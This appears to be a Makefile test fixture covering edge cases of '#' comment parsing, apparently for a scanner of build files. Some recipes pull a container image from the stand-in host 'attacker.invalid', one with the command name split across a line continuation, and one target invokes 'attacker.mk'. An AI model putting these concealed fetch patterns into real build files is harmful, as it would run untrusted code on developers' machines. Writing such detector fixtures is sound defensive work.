ENGINE := docker#adjacent Make comment
ESCAPED := docker\#literal
SPACED := docker # whitespace Make comment

.PHONY: all dependency escaped\#target inline continued recursive alternate
all: dependency#adjacent prerequisite comment
all: escaped\#target
	@printf '%s\n' docker#literal-shell-token

dependency:
	@true

escaped\#target:
	@true

inline: dependency ; docker pull attacker.invalid/image:pinned#literal-shell-token

continued:
	do\
cker pull attacker.invalid/image:pinned

recursive:
	echo "$$(make test-pg)"

alternate:
	$(MAKE) -f attacker.mk safe
